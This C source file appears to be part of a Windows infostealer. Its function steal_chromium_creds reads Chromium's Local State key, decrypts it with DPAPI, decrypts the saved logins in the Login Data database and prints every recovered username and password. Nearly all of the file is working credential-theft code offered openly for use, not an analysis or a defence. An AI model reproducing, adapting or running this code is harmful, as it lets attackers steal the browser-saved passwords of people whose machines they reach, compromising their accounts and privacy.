// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "chromium.h"

#include <dpapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "logins.h"
#include "path.h"
#include "sqlite3.h"

// "DPAPI" is prefixed to the base64 decoded key before encoding
// Meaning we need to remove 5 characters on the key is decoded as it is not
// part of encrypted key
#define DPAPI_KEY_PREFIX_LENGTH 5

// Retrieve an encrypted and base64 encoded key from the `localStatePath`
// NOTE: `encryptedKeyOut` must be freed by the caller
static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut) {
  HANDLE fileHandle =
      CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (fileHandle == INVALID_HANDLE_VALUE) {
    printf("Failed to open file. Error code: %lu\n", GetLastError());
    return EXIT_FAILURE;
  }

  DWORD fileSize = GetFileSize(fileHandle, NULL);
  if (fileSize == INVALID_FILE_SIZE) {
    printf("Failed to get file size. Error code: %lu\n", GetLastError());
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  // characters in the file are encoded in UTF-8
  PSTR fileBuffer = (PSTR)malloc(fileSize + 1);
  if (!fileBuffer) {
    printf("Failed to allocate memory for file buffer.\n");
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  DWORD bytesRead;
  if (!ReadFile(fileHandle, fileBuffer, fileSize * sizeof(char), &bytesRead,
                NULL)) {
    printf("Failed to read file. Error code: %lu\n", GetLastError());
    free(fileBuffer);
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }
  CloseHandle(fileHandle);

  fileBuffer[fileSize] = '\0';

  const char *key = "\"encrypted_key\":";
  PSTR cursor = strstr(fileBuffer, key);
  if (!cursor) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  // skip the key
  cursor += strlen(key);
  // skip whitespace and the beginning quote
  while (*cursor == ' ' || *cursor == '\t' || *cursor == '"') {
    cursor++;
  }

  // keep start position of the encrypted key
  PSTR start = cursor;
  // cursor now points to the end of the encrypted key (to get the length)
  while (*cursor != '"') {
    cursor++;
  }

  size_t length = cursor - start;
  *encryptedKeyOut = (PSTR)malloc(length + 1);
  if (!*encryptedKeyOut) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  strncpy(*encryptedKeyOut, start, length);
  (*encryptedKeyOut)[length] = '\0';

  free(fileBuffer);
  return EXIT_SUCCESS;
}

// Base64 decodes the `encryptedKey` and then decrypts it using DPAPI
// NOTE: `decryptedKeyOut` must be freed by the caller
static int decrypt_key(PCSTR encryptedKey, DATA_BLOB *decryptedKeyOut) {
  DWORD decodedBinarySize = 0;
  if (!CryptStringToBinaryA(encryptedKey, 0, CRYPT_STRING_BASE64, NULL,
                            &decodedBinarySize, NULL, NULL)) {
    fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
            GetLastError());
    return EXIT_FAILURE;
  }

  BYTE *decodedBinaryData = (BYTE *)malloc(decodedBinarySize);
  if (decodedBinaryData == NULL) {
    fprintf(stderr, "Failed allocating memory\n");
    return EXIT_FAILURE;
  }

  if (!CryptStringToBinaryA(encryptedKey, 0, CRYPT_STRING_BASE64,
                            decodedBinaryData, &decodedBinarySize, NULL,
                            NULL)) {
    fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
            GetLastError());
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }

  // Remove the first five bytes
  size_t newSize = decodedBinarySize - DPAPI_KEY_PREFIX_LENGTH;
  BYTE *newData = (BYTE *)malloc(newSize);
  if (newData == NULL) {
    fprintf(stderr, "Failed allocating memory\n");
    free(decodedBinaryData);
    return EXIT_FAILURE;
  }
  memcpy(newData, decodedBinaryData + DPAPI_KEY_PREFIX_LENGTH, newSize);
  free(decodedBinaryData);

  DATA_BLOB DataInput;
  DATA_BLOB DataOutput;

  DataInput.cbData = (DWORD)newSize;
  DataInput.pbData = newData;

  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
    fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
    free(newData);
    return EXIT_FAILURE;
  }

  // Set the output blob
  decryptedKeyOut->cbData = DataOutput.cbData;
  decryptedKeyOut->pbData = DataOutput.pbData;

  free(newData);
  return EXIT_SUCCESS;
}

int steal_chromium_creds() {
  PWSTR loginDataPath;
  if (get_logindata_path(&loginDataPath)) {
    fprintf(stderr, "Unable to get local appdata PATH");
    return EXIT_FAILURE;
  }

  Login *logins = NULL;
  int loginsCount = 0;
  if (chrmm_retrieve_logins(loginDataPath, &loginsCount, &logins)) {
    fprintf(stderr, "Could not retrieve logins from the database");
    return EXIT_FAILURE;
  }

  PWSTR localStatePath;
  if (get_localstate_path(&localStatePath)) {
    fprintf(stderr, "Unable to get local appdata PATH");
    return EXIT_FAILURE;
  }

  PSTR encryptedKey;
  if (retrieve_encrypted_key(localStatePath, &encryptedKey)) {
    wprintf(L"Could not retrieve key from %s\n", localStatePath);
    return EXIT_FAILURE;
  }

  DATA_BLOB decryptedBlob;
  if (decrypt_key((PCSTR)encryptedKey, &decryptedBlob)) {
    fprintf(stderr, "Could not decrypt key\n");
    return EXIT_FAILURE;
  }

  Credential *credentials = NULL;
  int credentialsCount = 0;

  if (decrypt_logins(logins, loginsCount, decryptedBlob.pbData, &credentials,
                     &credentialsCount) == EXIT_SUCCESS) {
    for (int i = 0; i < credentialsCount; i++) {
      printCredential(credentials[i]);
    }
    printf("====================\n");
    free(credentials);
  } else {
    printf("Failed to decrypt logins\n");
  }

  free_credentials(credentials, credentialsCount);
  free_logins(logins, loginsCount);
  LocalFree(decryptedBlob.pbData);  // allocated in decrypt_key
  free(encryptedKey);               // allocated in retrieve_encrypted_key
  free(localStatePath);             // allocated in get_localstate_path
  free(loginDataPath);              // allocated in get_logindata_path
  return EXIT_SUCCESS;
}
